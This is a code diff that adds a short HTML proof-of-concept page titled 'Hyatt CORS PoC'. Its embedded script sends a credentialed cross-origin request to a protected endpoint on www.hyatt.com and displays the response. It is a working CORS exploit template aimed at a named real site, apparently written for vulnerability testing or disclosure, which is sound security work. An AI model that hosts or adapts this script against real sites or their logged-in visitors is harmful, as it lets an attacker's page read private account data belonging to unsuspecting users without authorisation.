@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Hyatt CORS PoC</title>
+</head>
+<body>
+  <h1>Hyatt CORS PoC</h1>
+  <div id="result">Attempting to fetch sensitive data...</div>
+  <script>
+    // This PoC is hosted on "nikto.example.com".
+    // It sends an XMLHttpRequest to the target (e.g., a protected endpoint on www.hyatt.com).
+    var xhr = new XMLHttpRequest();
+    xhr.onreadystatechange = function() {
+      if (xhr.readyState === XMLHttpRequest.DONE) {
+        if (xhr.status === 200) {
+          document.getElementById("result").innerHTML = "<pre>" + xhr.responseText + "</pre>";
+        } else {
+          document.getElementById("result").innerText = "Request failed with status: " + xhr.status;
+        }
+      }
+    };
+    // Replace the URL below with the specific endpoint you want to test.
+    xhr.open("GET", "https://www.hyatt.com/protected-resource", true);
+    xhr.withCredentials = true; // Include cookies if applicable.
+    xhr.send();
+  </script>
+</body>
+</html>
